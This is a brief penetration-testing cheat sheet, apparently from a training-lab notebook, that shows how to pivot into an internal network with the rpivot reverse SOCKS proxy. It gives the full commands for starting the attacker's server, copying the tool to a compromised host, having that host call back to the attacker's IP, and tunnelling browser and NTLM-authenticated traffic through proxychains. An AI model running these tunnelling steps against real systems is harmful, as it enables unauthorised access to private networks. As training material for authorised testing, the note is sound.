---
description: A reverse SOCKS proxy tool written in Python for SOCKS tunneling
---

# Web Server Pivoting with Rpivot

Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.

**Cloning rpivot**

```shell-session
sudo git clone https://github.com/klsecservices/rpivot.git
```

> [https://github.com/lisp3r/rpivot2.git](https://github.com/lisp3r/rpivot2.git) for python3

**Running server.py from the Attack Host to connect to Pivot host.**

```shell-session
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

we will need to transfer rpivot to the target.

**Transfering rpivot to the Target**

```shell-session
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

**Running client.py from Pivot Target**

```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

Configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

**Browsing to the Target Webserver using Proxychains**

```shell-session
proxychains firefox-esr 172.16.5.135:80
```

**Connecting to a Web Server using HTTP-Proxy & NTLM Auth**

```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```



